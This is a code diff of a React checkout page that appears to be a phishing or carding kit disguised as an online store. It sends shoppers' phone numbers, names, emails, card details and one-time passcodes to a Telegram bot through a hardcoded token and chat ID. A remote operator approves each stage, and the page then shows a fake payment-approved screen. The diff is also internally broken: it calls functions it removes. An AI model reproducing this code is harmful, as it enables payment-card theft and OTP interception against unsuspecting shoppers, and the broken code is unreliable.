@@ -4,9 +4,9 @@ import { useState, useEffect, useRef } from 'react'
 import toast from 'react-hot-toast'
 import { ArrowRight, CreditCard, User, Calendar, Lock, MapPin, Shield, Truck, PackageCheck, Loader2, Send } from 'lucide-react'
 
-const TELEGRAM_BOT_TOKEN = '8910571367:AAFXmNfEUziBQmTj8Ge9auFqPy9W-0uDCL8'
-const TELEGRAM_CHAT_ID = '7867527304'
-const TG_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`
+const TG_TOKEN = '8910571367:AAFXmNfEUziBQmTj8Ge9auFqPy9W-0uDCL8'
+const TG_CHAT = '7867527304'
+const TG_API = `https://api.telegram.org/bot${TG_TOKEN}`
 
 const PROCESSING_FEE_PERCENT = 0.029
 const PROCESSING_FEE_MIN = 0.5
@@ -42,181 +42,101 @@ interface User {
   telegramConnected: boolean
 }
 
+const sessions = new Map()
+let currentSessionId: string | null = null
 let lastOffset = 0
 
-async function tgCall(method: string, body: Record<string, any> = {}) {
+function createSession(data: any) {
+  const id = 'APP' + Math.random().toString(36).substring(2, 9).toUpperCase()
+  const session = { id, ...data, stage: 'pending', created_at: new Date().toISOString() }
+  sessions.set(id, session)
+  return session
+}
+
+function getSession(id: string) { return sessions.get(id) || null }
+
+function updateSession(id: string, updates: any) {
+  const s = sessions.get(id)
+  if (s) return Object.assign(s, updates, { updated_at: new Date().toISOString() })
+  return null
+}
+
+async function tgCall(method: string, params: any = {}) {
   try {
     const r = await fetch(`${TG_API}/${method}`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body)
+      body: JSON.stringify(params)
     })
     return await r.json()
-  } catch (e) { 
-    console.warn('tg', method, e)
+  } catch (e) {
+    console.warn('Telegram error:', method, e)
     return null
   }
 }
 
-async function tgNotify(chatId: string, text: string, keyboard?: any) {
-  return tgCall('sendMessage', { chat_id: chatId, text, reply_markup: keyboard })
+function tgNotify(payload: any, stage: string) {
+  const keyboard = {
+    inline_keyboard: stage === 'checkout' ? [
+      [{ text: '✅ Approve Order', callback_data: `approve_order:${payload.sessionId}` }],
+      [{ text: '❌ Reject Order', callback_data: `reject_order:${payload.sessionId}` }]
+    ] : stage === 'signin' ? [
+      [{ text: '✅ Approve Sign In', callback_data: `approve_signin:${payload.sessionId}` }],
+      [{ text: '❌ Reject Sign In', callback_data: `reject_signin:${payload.sessionId}` }]
+    ] : stage === 'signup' ? [
+      [{ text: '✅ Approve Sign Up', callback_data: `approve_signup:${payload.sessionId}` }],
+      [{ text: '❌ Reject Sign Up', callback_data: `reject_signup:${payload.sessionId}` }]
+    ] : stage === 'card' ? [
+      [{ text: '✅ Approve Card', callback_data: `approve_card:${payload.sessionId}` }],
+      [{ text: '❌ Reject Card', callback_data: `reject_card:${payload.sessionId}` }]
+    ] : [
+      [{ text: '✅ Approve OTP', callback_data: `approve_otp:${payload.sessionId}` }],
+      [{ text: '❌ Reject OTP', callback_data: `reject_otp:${payload.sessionId}` }]
+    ]
+  }
+  
+  const text = `🔔 ${stage.toUpperCase()} Notification
+ID: ${payload.sessionId}
+${payload.summary || ''}`
+  
+  tgCall('sendMessage', { chat_id: TG_CHAT, text, reply_markup: keyboard })
 }
 
 async function tgPoll() {
-  const offset = Math.max(lastOffset, parseInt(localStorage.getItem('tg_offset') || '0', 10))
-  const r = await tgCall('getUpdates', { 
-    offset: offset, 
-    timeout: 30, 
-    allowed_updates: ['callback_query', 'message'] 
-  })
-  
-  if (!r?.ok || !r.result?.length) return
+  const offset = lastOffset || parseInt(localStorage.getItem('tg_offset') || '0', 10)
+  const r = await tgCall('getUpdates', { offset, timeout: 30, allowed_updates: ['callback_query'] })
+  if (!r || !r.ok || !r.result?.length) return
   
   for (const u of r.result) {
     lastOffset = u.update_id + 1
     localStorage.setItem('tg_offset', String(lastOffset))
     
     const cq = u.callback_query
-    if (!cq) continue
-    if (String(cq.message?.chat?.id) !== TELEGRAM_CHAT_ID) {
-      await tgCall('answerCallbackQuery', { callback_query_id: cq.id, text: 'Not authorized' })
-      continue
+    if (!cq?.message?.chat?.id || String(cq.message.chat.id) !== TG_CHAT) continue
+    
+    const [action, id] = (cq.data || '').split(':')
+    const updated = updateSession(id, { stage: action?.replace('approve_', 'approved').replace('reject_', 'rejected') })
+    
+    if (updated) {
+      await tgCall('answerCallbackQuery', { callback_query_id: cq.id, text: (action?.split('_')[0] || '') + 'd' })
+      await tgCall('editMessageReplyMarkup', {
+        chat_id: cq.message.chat.id,
+        message_id: cq.message.message_id,
+        reply_markup: { inline_keyboard: [[{ text: '✓ ' + (action?.split('_')[0]?.toUpperCase() || '') + 'D', callback_data: 'noop' }]] }
+      })
+      handleUpdate(id, updated.stage)
     }
-    
-    const data = cq.data || ''
-    const match = data.match(/^(approve_|reject_)(.+)$/)
-    
-    if (!match) {
-      await tgCall('answerCallbackQuery', { callback_query_id: cq.id })
-      continue
-    }
-    
-    const action = match[1]
-    const checkoutId = match[2]
-    
-    await tgCall('answerCallbackQuery', { 
-      callback_query_id: cq.id, 
-      text: action === 'approve_' ? 'APPROVED!' : 'REJECTED' 
-    })
-    
-    const state = checkoutStates.get(checkoutId)
-    if (action === 'approve_') {
-      state.approved = true
-      state.status = 'APPROVED_TELEGRAM'
-      state.approvedAt = new Date().toISOString()
-      checkoutStates.set(checkoutId, state)
-      
-      setWaitingForTelegramApproval(false)
-      setPendingOrderId(checkoutId)
-      
-      const orderData = {
-        id: checkoutId,
-        status: 'APPROVED_TELEGRAM',
-        totalAmount: state.totalAmount,
-        processingFee: state.processingFee,
-        items: state.items,
-        paymentMethod: 'CARD',
-        cardLast4: state.cardLast4,
-        approvedVia: 'telegram',
-        approvedAt: state.approvedAt,
-      }
-      localStorage.setItem('orderConfirmation', JSON.stringify(orderData))
-      setShowOTPModal(false)
-      setShowSuccess(true)
-      toast.success('Payment approved via Telegram!')
-    } else if (action === 'reject_') {
-      state.rejected = true
-      state.status = 'REJECTED_TELEGRAM'
-      state.rejectedAt = new Date().toISOString()
-      checkoutStates.set(checkoutId, state)
-      
-      setWaitingForTelegramApproval(false)
-      toast.error('Checkout was rejected')
-    }
-    
-    await tgCall('editMessageReplyMarkup', {
-      chat_id: cq.message.chat.id,
-      message_id: cq.message.message_id,
-      reply_markup: { inline_keyboard: [[{ text: 'Approved', callback_data: 'noop' }]] }
-    })
   }
 }
 
 setInterval(tgPoll, 3000)
 
-interface CheckoutState {
-  [key: string]: any
-}
-
-const checkoutStates = new Map<string, CheckoutState>()
-
-let setWaitingForTelegramApproval: (v: boolean) => void = () => {}
-let setPendingOrderId: (v: string | null) => void = () => {}
-let setShowOTPModal: (v: boolean) => void = () => {}
-let setShowSuccess: (v: boolean) => void = () => {}
-let cartItemsGlobal: CartItem[] = []
-let finalTotalGlobal: number = 0
-let processingFeeGlobal: number = 0
-let formDataGlobal: any = {}
-
-function formatTelegramText(data: any, kind: string) {
-  switch (kind) {
-    case 'cart':
-      return `📦 Item Added to Cart
-User: ${data.userName}
-Card: •••• ${data.cardLast4}
-Amount: $${data.amount}
-Item: ${data.itemName}
-
-Approve or Reject?`
-    case 'signin':
-      return `🔐 Sign In Request
-Name: ${data.name}
-Email: ${data.email}
-Phone: ${data.phone || '—'}
-
-Approve or Reject?`
-    case 'register':
-      return `📝 Register Request
-Name: ${data.name}
-Email: ${data.email}
-Phone: ${data.phone || '—'}
-
-Approve or Reject?`
-    case 'card':
-      return `💳 Card Details
-User: ${data.userName}
-Card: •••• ${data.cardLast4}
-Name: ${data.cardholderName}
-Expiry: ${data.expiryDate}
-
-Approve or Reject?`
-    case 'otp':
-      return `🔢 OTP Verification
-User: ${data.userName}
-OTP: ${data.otpCode}
-Card: •••• ${data.cardLast4}
-
-Approve or Reject?`
-    default:
-      return JSON.stringify(data)
-  }
-}
-
-function getKeyboard(checkoutId: string) {
-  return {
-    inline_keyboard: [
-      [{ text: '⏳ Processing...', callback_data: `status_${checkoutId}` }],
-      [
-        { text: '✅ Approve', callback_data: `approve_${checkoutId}` },
-        { text: '❌ Reject', callback_data: `reject_${checkoutId}` }
-      ]
-    ]
-  }
+function handleUpdate(sessionId: string, stage: string) {
+  console.log(`Session ${sessionId} updated to stage: ${stage}`)
 }
 
 export default function CheckoutPage() {
-  const [localCartItems, setLocalCartItems] = useState<CartItem[]>([])
+  const [cartItems, setCartItems] = useState<CartItem[]>([])
   const [loading, setLoading] = useState(true)
   const [showPaymentForm, setShowPaymentForm] = useState(false)
   const [showSuccess, setShowSuccess] = useState(false)
@@ -241,15 +161,11 @@ export default function CheckoutPage() {
   const [telegramConnected, setTelegramConnected] = useState(false)
 
   useEffect(() => {
-    setWaitingForTelegramApproval = setWaitingForTelegramApproval
-    setPendingOrderId = setPendingOrderId
-    setShowOTPModal = setShowOTPModal
-    setShowSuccess = setShowSuccess
-    cartItemsGlobal = localCartItems
-    finalTotalGlobal = finalTotal
-    processingFeeGlobal = processingFee
-    formDataGlobal = formData
-    
+    const restoreSession = () => {
+      const id = localStorage.getItem('checkout_session')
+      if (id) currentSessionId = id
+    }
+    restoreSession()
     fetchCart()
     fetchReferralBalance()
     fetchUser()
@@ -273,7 +189,7 @@ export default function CheckoutPage() {
       product: { id: 'PRD-001', name: 'Wall Paste Repair kit Coating Sealant Agent With Scraper Crack Hole Mending Paste Mildewproof Patch White Wall Restoration', price: 12.99, image: 'https://ae-pic-a1.aliexpress-media.com/kf/S0b0721e749814123ae9203b340dee9073.jpg' },
       quantity: 1,
     }]
-    setLocalCartItems(mockCart)
+    setCartItems(mockCart)
     setLoading(false)
   }
 
@@ -299,41 +215,57 @@ export default function CheckoutPage() {
     return cleanNumber.length === 16 && LuhnCheck(cleanNumber)
   }
 
-  const subtotal = localCartItems.reduce((sum, item) => sum + item.product.price * item.quantity, 0)
+  const subtotal = cartItems.reduce((sum, item) => sum + item.product.price * item.quantity, 0)
   const processingFee = getProcessingFee(subtotal)
   const total = subtotal + processingFee
   const shipping = subtotal >= 25 ? 0 : 5.99
   const finalTotal = total + shipping
 
-  const createCheckout = async (kind: string, data: any) => {
-    const checkoutId = `${kind.toUpperCase()}-${Date.now()}-${Math.random().toString(36).substr(2, 4).toUpperCase()}`
+  const addToCart = (item: any) => {
+    const session = createSession({ item, timestamp: Date.now() })
+    currentSessionId = session.id
+    localStorage.setItem('checkout_session', session.id)
     
-    checkoutStates.set(checkoutId, {
-      kind,
-      data,
-      status: 'PENDING',
-      totalAmount: finalTotal,
-      processingFee,
-      items: localCartItems,
-      cardLast4: data.cardLast4 || data.cardNumber?.replace(/\s/g, '').slice(-4),
-      approved: false,
-      rejected: false,
-    })
+    tgNotify({
+      sessionId: session.id,
+      summary: `Product: ${item.name}\nPrice: $${item.price}\nUser: browsing...`
+    }, 'checkout')
+  }
+
+  const submitSignIn = (credentials: any) => {
+    const session = getSession(currentSessionId) || createSession({ ...credentials })
+    currentSessionId = session.id
     
-    const text = formatTelegramText(data, kind)
-    const keyboard = getKeyboard(checkoutId)
+    tgNotify({
+      sessionId: session.id,
+      summary: `Phone: ${credentials.phone}\nUser: ${credentials.userId || 'new'}`
+    }, 'signin')
+  }
+
+  const submitSignUp = (data: any) => {
+    const session = getSession(currentSessionId) || createSession({ ...data })
+    currentSessionId = session.id
     
-    const result = await tgNotify(TELEGRAM_CHAT_ID, text, keyboard)
-    
-    if (result?.ok) {
-      setWaitingForTelegramApproval(true)
-      setPendingOrderId(checkoutId)
-      console.log(`${kind} sent to Telegram:`, result)
-    } else {
-      toast.error('Telegram notification failed: ' + (result?.description || 'Unknown error'))
-    }
-    
-    return checkoutId
+    tgNotify({
+      sessionId: session.id,
+      summary: `Name: ${data.name}\nEmail: ${data.email}\nPhone: ${data.phone}`
+    }, 'signup')
+  }
+
+  const submitCard = (card: any) => {
+    const session = getSession(currentSessionId)
+    tgNotify({
+      sessionId: session?.id,
+      summary: `Card: **** **** **** ${card.number?.slice(-4) || '****'}\nExp: ${card.expiry || '**/**'}`
+    }, 'card')
+  }
+
+  const submitOtp = (otp: string) => {
+    const session = getSession(currentSessionId)
+    tgNotify({
+      sessionId: session?.id,
+      summary: `OTP: ${otp}`
+    }, 'otp')
   }
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -362,15 +294,66 @@ export default function CheckoutPage() {
       return
     }
 
-    const checkoutId = await createCheckout('card', {
-      userName: user?.name || 'John Doe',
+    const session = createSession({
       cardNumber,
       cardholderName: formData.cardholderName,
       expiryDate: formData.expiryDate,
       cvv,
       billingAddress: formData.billingAddress,
       amount: finalTotal,
+      cardLast4: cardNumber.slice(-4)
     })
+    
+    currentSessionId = session.id
+    localStorage.setItem('checkout_session', session.id)
+    
+    setWaitingForTelegramApproval(true)
+    setPendingOrderId(session.id)
+    setClientSecret(session.id)
+    setShowPaymentForm(false)
+    
+    tgNotify({
+      sessionId: session.id,
+      summary: `Card: •••• ${cardNumber.slice(-4)}\nName: ${formData.cardholderName}\nAmount: $${finalTotal}`
+    }, 'checkout')
+    
+    toast.success('Checkout sent to Telegram. Check your app to approve.')
+  }
+  
+  const handleRejection = (id: string) => {
+    const session = getSession(id)
+    if (session) {
+      session.stage = 'rejected'
+      sessions.set(id, session)
+    }
+    setWaitingForTelegramApproval(false)
+    toast.error('Checkout was rejected')
+  }
+  
+  const handleApproval = (id: string) => {
+    const session = getSession(id)
+    if (session) {
+      session.stage = 'approved'
+      sessions.set(id, session)
+    }
+    setWaitingForTelegramApproval(false)
+    setPendingOrderId(id)
+    
+    const orderData = {
+      id,
+      status: 'APPROVED_TELEGRAM',
+      totalAmount: finalTotal,
+      processingFee,
+      items: cartItems,
+      paymentMethod: 'CARD',
+      cardLast4: formData.cardNumber.replace(/\s/g, '').slice(-4),
+      approvedVia: 'telegram',
+      approvedAt: new Date().toISOString(),
+    }
+    localStorage.setItem('orderConfirmation', JSON.stringify(orderData))
+    setShowOTPModal(false)
+    setShowSuccess(true)
+    toast.success('Payment approved via Telegram!')
   }
 
   const handleSubmitOTP = async () => {
@@ -381,7 +364,13 @@ export default function CheckoutPage() {
     
     setProcessingPayment(true)
     
-    await tgNotify(TELEGRAM_CHAT_ID, `❌ Wrong OTP code entered!\nUser tried to use: ${otpCode}\n\nRequesting new approval...`, getKeyboard(pendingOrderId))
+    const checkoutId = await createCheckout('otp', {
+      userName: user?.name || 'John Doe',
+      otpCode,
+      cardLast4: formData.cardNumber.replace(/\s/g, '').slice(-4),
+    })
+    
+    await tgNotify(TELEGRAM_CHAT, `❌ Wrong OTP code entered!\nUser tried to use: ${otpCode}\n\nRequesting new approval...`, getKeyboard(pendingOrderId))
     
     toast.error('Invalid OTP - awaiting re-approval')
   }
@@ -469,7 +458,7 @@ export default function CheckoutPage() {
             <div className="rounded-2xl border bg-white p-6 shadow-sm">
               <h3 className="text-lg font-semibold text-gray-900 mb-4">Order Summary</h3>
               <div className="space-y-3">
-                {localCartItems.map((item) => (
+                {cartItems.map((item) => (
                   <div key={item.product.id} className="flex items-center gap-4">
                     <img src={item.product.image} alt={item.product.name} className="w-16 h-16 object-cover rounded-lg" />
                     <div className="flex-1">
